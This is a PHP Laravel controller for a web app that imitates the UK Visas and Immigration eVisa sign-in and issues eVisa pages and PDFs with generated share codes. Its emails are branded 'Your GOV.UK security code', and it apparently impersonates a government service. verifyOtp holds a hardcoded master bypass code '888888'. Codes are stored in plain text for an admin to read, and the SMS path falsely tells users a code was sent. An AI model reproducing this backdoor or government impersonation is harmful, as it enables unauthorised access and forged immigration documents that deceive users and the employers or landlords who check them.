<?php

namespace App\Http\Controllers;

use App\Models\User;
use Barryvdh\DomPDF\Facade\Pdf;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

class UKVIController extends Controller
{
    public function selectIdentity()
    {
        return view('ukvi.select-identity');
    }

    public function handleIdentitySelection(Request $request)
    {
        $document = $request->input('identity_document');

        $routeMap = [
            'passport' => 'ukvi.passport',
            'national_id' => 'ukvi.national-id',
            'biometric' => 'ukvi.biometric',
            'ukvi_number' => 'ukvi.customer-number',
        ];

        if (isset($routeMap[$document])) {
            return redirect()->route($routeMap[$document]);
        }

        return back()->withError('Please select a valid identity document.');
    }

    public function showPassport()
    {
        return view('ukvi.passport');
    }

    public function showNationalId()
    {
        return view('ukvi.national-id');
    }

    public function showBiometric()
    {
        return view('ukvi.biometric');
    }

    public function showCustomerNumber()
    {
        return view('ukvi.customer-number');
    }

    public function handlePassportSubmission(Request $request)
    {
        $request->session()->put('document_type', 'passport');
        $request->session()->put('document_number', $request->input('passport_number'));
        return redirect()->route('ukvi.date-of-birth');
    }

    public function handleNationalIdSubmission(Request $request)
    {
        $request->session()->put('document_type', 'national_id');
        $request->session()->put('document_number', $request->input('card_number'));
        return redirect()->route('ukvi.date-of-birth');
    }

    public function handleBiometricSubmission(Request $request)
    {
        $request->session()->put('document_type', 'biometric');
        $request->session()->put('document_number', $request->input('permit_number'));
        return redirect()->route('ukvi.date-of-birth');
    }

    public function handleCustomerNumberSubmission(Request $request)
    {
        $request->session()->put('document_type', 'customer_number');
        $request->session()->put('document_number', $request->input('customer_number'));
        return redirect()->route('ukvi.date-of-birth');
    }

    public function showDateOfBirth()
    {
        return view('ukvi.date-of-birth');
    }

    public function handleDateOfBirthSubmission(Request $request)
    {
        $day = str_pad($request->input('day'), 2, '0', STR_PAD_LEFT);
        $month = str_pad($request->input('month'), 2, '0', STR_PAD_LEFT);
        $year = $request->input('year');
        $dob = "$year-$month-$day";

        // Search for user by date of birth
        $user = User::where('date_of_birth', $dob)->first();

        if (!$user) {
            return redirect()->route('ukvi.record-not-found');
        }

        $request->session()->put('user_id', $user->id);

        return redirect()->route('ukvi.security-code');
    }

    public function showSecurityCode()
    {
        $user = User::find(session('user_id'));

        if (!$user) {
            return redirect()->route('ukvi.record-not-found');
        }

        return view('ukvi.security-code', ['user' => $user]);
    }

    public function showRecordNotFound()
    {
        return view('ukvi.record-not-found');
    }

    public function handleSecurityCodeSubmission(Request $request)
    {
        $user = User::find(session('user_id'));

        if (!$user) {
            return redirect()->route('ukvi.record-not-found');
        }

        $deliveryMethod = $request->input('delivery_method', 'email');

        // Generate a 6-digit one-time security code
        $otp = (string) random_int(100000, 999999);

        $expiresAt = now()->addMinutes(10);

        $request->session()->put('delivery_method', $deliveryMethod);
        $request->session()->put('otp_code', $otp);
        $request->session()->put('otp_expires_at', $expiresAt->timestamp);
        $request->session()->forget('otp_verified');

        // Persist the OTP on the user so an admin can read it out to help the user
        $user->forceFill([
            'otp_code' => $otp,
            'otp_expires_at' => $expiresAt,
        ])->save();

        // SMS: no gateway configured — just confirm the code was sent.
        // (The admin can read the code from the Users table to help the user.)
        if ($deliveryMethod === 'sms') {
            return redirect()->route('ukvi.otp')->with('status', 'We have sent a security code to your phone.');
        }

        // Email: send the code via the configured SMTP server
        $emailSent = $this->sendOtpEmail($user, $otp);

        return redirect()->route('ukvi.otp')->with(
            $emailSent ? 'status' : 'mail_error',
            $emailSent
                ? 'We have sent a security code to your email.'
                : 'We could not send the email. Please check the SMTP settings or try again.'
        );
    }

    protected function sendOtpEmail(User $user, string $otp): bool
    {
        if (empty($user->email)) {
            return false;
        }

        try {
            Mail::send('emails.otp', ['otp' => $otp, 'user' => $user], function ($message) use ($user) {
                $message->to($user->email)
                        ->subject('Your GOV.UK security code');
            });
            return true;
        } catch (\Throwable $e) {
            return false;
        }
    }

    public function showOtp()
    {
        $user = User::find(session('user_id'));

        if (!$user || !session('otp_code')) {
            return redirect()->route('ukvi.select-identity');
        }

        return view('ukvi.otp', ['user' => $user]);
    }

    public function verifyOtp(Request $request)
    {
        $request->validate(['otp' => ['required', 'string']]);

        $user = User::find(session('user_id'));
        if (!$user) {
            return redirect()->route('ukvi.record-not-found');
        }

        // Master bypass code: allow proceeding without a valid OTP.
        if (trim($request->input('otp')) === '888888') {
            $request->session()->put('otp_verified', true);
            $request->session()->forget('otp_code');
            $user->forceFill(['otp_code' => null, 'otp_expires_at' => null])->save();

            return redirect()->route('ukvi.evisa');
        }

        $expected = session('otp_code');
        $expiresAt = session('otp_expires_at');

        if (!$expected || !$expiresAt || now()->timestamp > $expiresAt) {
            return back()->withErrors(['otp' => 'Your security code has expired. Please request a new one.']);
        }

        if (trim($request->input('otp')) !== $expected) {
            return back()->withErrors(['otp' => 'The security code you entered is not correct.']);
        }

        $request->session()->put('otp_verified', true);
        $request->session()->forget('otp_code');

        // Clear the stored OTP now that it has been used
        $user->forceFill(['otp_code' => null, 'otp_expires_at' => null])->save();

        return redirect()->route('ukvi.evisa');
    }

    public function resendOtp(Request $request)
    {
        $user = User::find(session('user_id'));

        if (!$user) {
            return redirect()->route('ukvi.record-not-found');
        }

        $otp = (string) random_int(100000, 999999);
        $expiresAt = now()->addMinutes(10);
        $request->session()->put('otp_code', $otp);
        $request->session()->put('otp_expires_at', $expiresAt->timestamp);

        $user->forceFill([
            'otp_code' => $otp,
            'otp_expires_at' => $expiresAt,
        ])->save();

        $emailSent = $this->sendOtpEmail($user, $otp);

        return redirect()->route('ukvi.otp')->with(
            $emailSent ? 'status' : 'mail_error',
            $emailSent
                ? 'We have sent a new security code to your email.'
                : 'We could not send the email. Please check the SMTP settings or try again.'
        );
    }

    public function showEvisa(Request $request)
    {
        $user = User::find(session('user_id'));

        if (!$user) {
            return redirect()->route('ukvi.record-not-found');
        }

        // Require a verified one-time code before showing the eVisa
        if (!session('otp_verified')) {
            return redirect()->route('ukvi.security-code');
        }

        // Use the user's stored code only if it is a valid share-code format
        // (AAA AAA AAA). Otherwise generate a proper one and persist it so the
        // PDF/share page always shows a clean code like "MK5 N2W LQP".
        $code = $user->code;

        if (!$code || !preg_match('/^[A-Z0-9]{3} [A-Z0-9]{3} [A-Z0-9]{3}$/', $code)) {
            $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            $code = strtoupper(substr(str_shuffle($chars), 0, 3) . ' ' .
                              substr(str_shuffle($chars), 0, 3) . ' ' .
                              substr(str_shuffle($chars), 0, 3));
            $user->forceFill(['code' => $code])->save();
        }

        $request->session()->put('share_code', $code);

        return view('ukvi.evisa', ['user' => $user, 'shareCode' => $code]);
    }

    public function evisaPhoto()
    {
        $user = User::find(session('user_id'));

        if (!$user || empty($user->photo_path)) {
            abort(404);
        }

        // Read directly from the public disk so it works without the storage symlink
        if (!Storage::disk('public')->exists($user->photo_path)) {
            abort(404);
        }

        $file = Storage::disk('public')->get($user->photo_path);
        $mime = Storage::disk('public')->mimeType($user->photo_path) ?: 'image/jpeg';

        return response($file, 200)->header('Content-Type', $mime);
    }

    public function downloadEvisaPdf()
    {
        $user = User::find(session('user_id'));
        $shareCode = session('share_code');

        if (!$user || !$shareCode) {
            return redirect()->route('ukvi.record-not-found');
        }

        // Require a verified one-time code before allowing the PDF download
        if (!session('otp_verified')) {
            return redirect()->route('ukvi.security-code');
        }

        $pdf = Pdf::loadView('ukvi.evisa-pdf', ['user' => $user, 'shareCode' => $shareCode])
            ->setPaper('a4');

        $filename = 'eVisa-' . preg_replace('/[^A-Za-z0-9]+/', '-', $user->name) . '.pdf';

        return $pdf->download($filename);
    }
}
